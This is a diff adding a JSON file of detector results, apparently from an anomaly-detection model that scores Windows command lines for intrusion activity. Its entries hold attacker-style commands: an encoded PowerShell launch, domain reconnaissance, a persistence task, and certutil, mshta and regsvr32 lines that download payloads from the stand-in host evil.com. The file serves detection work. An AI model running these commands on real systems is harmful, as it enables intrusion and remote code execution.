@@ -1,0 +1,244 @@
+[
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:00:00+00:00",
+    "command_line": "powershell.exe -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA",
+    "score": 0.5891,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "cmd_len",
+        31.1238
+      ],
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_entropy",
+        4.189
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:01:00+00:00",
+    "command_line": "whoami /all",
+    "score": 0.5877,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "has_parent_cmd",
+        1.5734
+      ],
+      [
+        "has_hash",
+        1.5452
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:02:00+00:00",
+    "command_line": "net group \"Domain Admins\" /domain",
+    "score": 0.5926,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_len",
+        2.5559
+      ],
+      [
+        "cmd_entropy",
+        2.1142
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:03:00+00:00",
+    "command_line": "schtasks /create /tn \"EvilTask\" /tr \"cmd.exe /c echo pwned\" /sc ONSTART",
+    "score": 0.6138,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_len",
+        9.4267
+      ],
+      [
+        "cmd_special_chars",
+        7.093
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:04:00+00:00",
+    "command_line": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\payload.exe",
+    "score": 0.6317,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_len",
+        11.054
+      ],
+      [
+        "cmd_special_chars",
+        10.5492
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:05:00+00:00",
+    "command_line": "mshta.exe http://evil.com/evil.hta",
+    "score": 0.6317,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_special_chars",
+        4.5008
+      ],
+      [
+        "cmd_len",
+        2.7367
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:06:00+00:00",
+    "command_line": "wmic process call create \"powershell.exe -c calc.exe\"",
+    "score": 0.6317,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_len",
+        6.1721
+      ],
+      [
+        "cmd_special_chars",
+        2.7727
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:07:00+00:00",
+    "command_line": "regsvr32 /s /u /i:http://evil.com/payload.sct scrobj.dll",
+    "score": 0.6317,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_special_chars",
+        7.957
+      ],
+      [
+        "cmd_len",
+        6.7145
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:08:00+00:00",
+    "command_line": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"",
+    "score": 0.6317,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_len",
+        6.7145
+      ],
+      [
+        "cmd_special_chars",
+        6.2289
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:09:00+00:00",
+    "command_line": "nmap -sS -p- 10.0.0.0/24",
+    "score": 0.6271,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_special_chars",
+        4.5008
+      ],
+      [
+        "events_in_window",
+        2.4564
+      ]
+    ]
+  },
+  {
+    "event_id": "1",
+    "timestamp": "2026-09-17T22:10:00+00:00",
+    "command_line": "notepad.exe C:\\Temp\\notes.txt",
+    "score": 0.6317,
+    "is_anomaly": true,
+    "true_label": 1,
+    "top_features": [
+      [
+        "user_rarity",
+        29.6884
+      ],
+      [
+        "cmd_special_chars",
+        2.7727
+      ],
+      [
+        "events_in_window",
+        2.4564
+      ]
+    ]
+  }
+]
